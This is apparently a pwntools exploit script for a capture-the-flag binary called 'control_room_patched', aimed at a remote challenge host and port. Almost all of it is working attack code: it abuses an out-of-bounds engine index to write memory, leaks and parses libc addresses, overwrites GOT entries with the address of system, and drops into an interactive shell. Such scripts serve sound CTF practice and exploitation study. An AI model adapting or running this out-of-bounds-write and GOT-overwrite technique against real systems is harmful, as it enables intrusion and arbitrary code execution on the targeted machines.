#!/usr/bin/python2

from pwn import *

exe = ELF("control_room_patched")
libc = ELF("libc.so.6")

context.binary = exe

ru = lambda r,a : r.recvuntil("{}".format(a))
rl = lambda r : r.recvline()
re = lambda r,a : r.recv("{}".format(a))
sl = lambda r,a : r.sendline("{}".format(a))
se = lambda r,a : r.sendline("{}".format(a))
sla = lambda r,a,b : r.sendlineafter("{}".format(a),"{}".format(b))
g = lambda r: gdb.attach(r)
gs = lambda r,a : gdb.attach(r, gdbscript = a)

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote('159.65.94.38',30776)

    return r

def init(r):
    sla(r, "username: ","A"*0x100)
    #sla(r, ">", "n")
    r.sendafter("size: ", "256\x0a")
    sla(r, "username: ", "A"*0xFE)

def switch_role(r, role):
    sla(r, '5]: ', 5)
    sla(r, 'role: ', role)

def set_routes(r, routes, bitch=True):
    sla(r,'5]:', 3)
    for route in routes:
        sla(r, ' : ', route[0])
        sla(r, ' : ', route[1])
    if bitch:
        sla(r, '>', 'y')

def configure_engines(r, idx, thrust, mixture):
    sla(r, "5]:", 1)
    sla(r, "]:", idx)
    sla(r, "rust: ", thrust)
    sla(r, "ratio: ", mixture)
    sla(r, ">", "y")

def parse_leaks(r):
    sla(r,']:',4)
    leaks = []
    for i in range(8):
        ru(r, ': ')
        leak = r.recvuntil('\n', drop=True)
        leak = int(leak, 10)
        leaks.append(leak)
    return leaks

def main():
    r = conn()

    init(r)
    log.info("switched to the captain role")

    # good luck pwning :)
    #routes1 = [
    #        (0x41414141,0x41414141),
    #        (0x41414142,0x41414142),
    #        (0x41414143,0x41414143),
    #        (0x41414144,0x41414144),
    #        ]
    #set_routes(r, routes1)

    switch_role(r, 1)

    log.info("switched to Technician\nsetting up the role to be remappable")
    
    configure_engines(r, 0, 0x1,0x1)
    configure_engines(r, 1, 0x1,0x1)

    configure_engines(r, -2, 0x405020, 0x43434343)


    configure_engines(r, 0, 0x0, 0x0)

    log.info("switched back to captain, leaking libc")

    sla(r, '5]:',3)
    r.sendafter(':', '\x00')
    sla(r, '>', 'y')
    

    leaks = parse_leaks(r)

    log.info("------------LEAKS--------------")

    for leak in leaks:
        log.info("Leaked: {}".format(hex(leak)))

    libcs = [
            ('040', 0x264040),
            ]

    libc_base = leaks[1]-0x43654
    atoi = libc_base + 0x43640
    system = libc_base + 0x050d60
    scanf = libc_base + 0x62110

    #g(r)
    log.info("libc base: {}".format(hex(libc_base)))
    log.info("libc system: {}".format(hex(system)))
    log.info("libc scanf: {}".format(hex(scanf)))
    
    log.info("Switch back to Technician to overwrite GOT")
    switch_role(r,1)

    configure_engines(r,-8, system, scanf)

    log.info("Spawning shell...")

    #sla(r, ':', 'sh')

    r.interactive()


if __name__ == "__main__":
    main()
